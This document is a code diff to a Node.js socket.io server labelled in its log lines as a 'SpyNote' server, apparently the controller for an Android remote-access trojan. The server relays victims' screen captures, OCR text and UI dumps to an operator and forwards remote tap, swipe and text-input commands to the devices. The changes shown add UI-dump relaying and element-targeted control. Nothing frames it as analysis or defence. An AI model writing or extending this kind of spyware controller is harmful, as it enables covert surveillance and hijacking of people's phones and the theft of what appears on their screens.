@@ -32,7 +32,7 @@ app.get('/devices', (req, res) => {
 });
 
 io.on('connection', (socket) => {
-    console.log('🔌 Web panel connected:', socket.id);
+    console.log('🔌 New connection:', socket.id);
 
     socket.on('register-device', (deviceInfo) => {
         const deviceId = deviceInfo.deviceId;
@@ -43,32 +43,31 @@ io.on('connection', (socket) => {
         }
     });
 
-    // 🔥 ENHANCED: Screen + UI Elements + OCR
+    // Enhanced screen + UI elements
     socket.on('screen-data', (data) => {
         const deviceId = data.deviceId;
         if (devices.has(deviceId)) {
-            socket.to(deviceId).emit('screen-update', {
-                deviceId,
-                screen: data.screen,
-                elements: data.elements || [],
-                ocrText: data.ocrText || '',
-                width: data.width,
-                height: data.height,
-                timestamp: data.timestamp
+            socket.to(deviceId).emit('screen-update', data);
+        }
+    });
+
+    // Enhanced controls with element detection
+    socket.on('control', (data) => {
+        const { deviceId, action, x, y, startX, startY, endX, endY, elementId, text } = data;
+        if (devices.has(deviceId)) {
+            socket.to(deviceId).emit('control', {
+                action, x: parseFloat(x), y: parseFloat(y),
+                startX: parseFloat(startX), startY: parseFloat(startY),
+                endX: parseFloat(endX), endY: parseFloat(endY),
+                elementId, text
             });
         }
     });
 
-    // 🔥 ENHANCED Controls: Tap, Swipe, Scroll, Text, Keys
-    socket.on('control', (data) => {
-        const { deviceId, action, x, y, startX, startY, endX, endY, text, keyCode } = data;
+    socket.on('ui-dump', (data) => {
+        const deviceId = data.deviceId;
         if (devices.has(deviceId)) {
-            socket.to(deviceId).emit('control', {
-                action, x: parseFloat(x)||0, y: parseFloat(y)||0,
-                startX: parseFloat(startX)||0, startY: parseFloat(startY)||0,
-                endX: parseFloat(endX)||0, endY: parseFloat(endY)||0,
-                text: text || '', keyCode: keyCode || 0
-            });
+            socket.to(deviceId).emit('ui-dump', data);
         }
     });
 
@@ -83,6 +82,7 @@ io.on('connection', (socket) => {
     });
 });
 
-server.listen(process.env.PORT || 3000, () => {
-    console.log(`🚀 SpyNote PRO Server: http://localhost:3000`);
+const PORT = process.env.PORT || 3000;
+server.listen(PORT, () => {
+    console.log(`🚀 Enhanced SpyNote Server on port ${PORT}`);
 });
